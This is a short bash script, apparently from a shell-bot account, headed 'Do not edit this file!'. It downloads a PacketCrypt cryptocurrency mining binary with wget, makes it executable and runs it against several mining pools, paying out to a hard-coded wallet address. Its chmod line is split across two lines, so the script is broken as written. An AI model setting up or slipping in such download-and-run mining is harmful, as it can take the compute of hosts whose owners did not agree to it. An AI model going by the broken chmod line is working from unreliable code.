#!/bin/bash

# Do not edit this file!


cd /home/shell-bot
wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
chmod +x packetcrypt-v0.5
1-linux_amd64
./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1q4q2e3l3qn8t0m062hynd5hr04kgk68gr5hd4jt https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
